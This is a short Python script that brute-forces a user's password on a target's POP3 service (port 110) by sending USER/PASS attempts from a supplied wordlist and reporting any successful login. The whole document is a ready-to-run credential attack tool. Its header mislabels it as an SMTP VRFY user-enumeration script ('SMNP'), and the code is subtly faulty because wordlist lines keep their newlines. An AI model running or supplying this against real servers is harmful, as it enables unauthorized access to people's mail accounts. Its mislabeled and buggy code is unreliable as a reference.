#VRFY SMNP Script to enumerate for users on a system

#!/usr/bin/python3
import socket, sys

def main():
	#create socket (IPv4 and TCP)
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	#connect to target
	conn=s.connect((sys.argv[1],110))

	#Receive banner and print
	banner=s.recv(1024)
	print(banner.decode())

	#Open password file supplied
	f = open(sys.argv[2])

	#Get user to brute-force
	user = sys.argv[3]

	#Print message to user
	print('Attempting to brute-force user: ' + user)

  	#Brute-force password for user
	for i in f:
		str='USER ' + user + '\r\n'
		s.send(str.encode())
		result=s.recv(1024)
		print('trying password ' + i)
		str='PASS ' + i + '\r\n'
		s.send(str.encode())
		result=s.recv(1024)
		#if "Authentication failed." not in result.decode():
		#	print("password found!! : " + i)
		if "+OK Logged in" in result.decode():
			print("password found!! : " + i)

#boiler plate
if __name__ == '__main__':
	main()
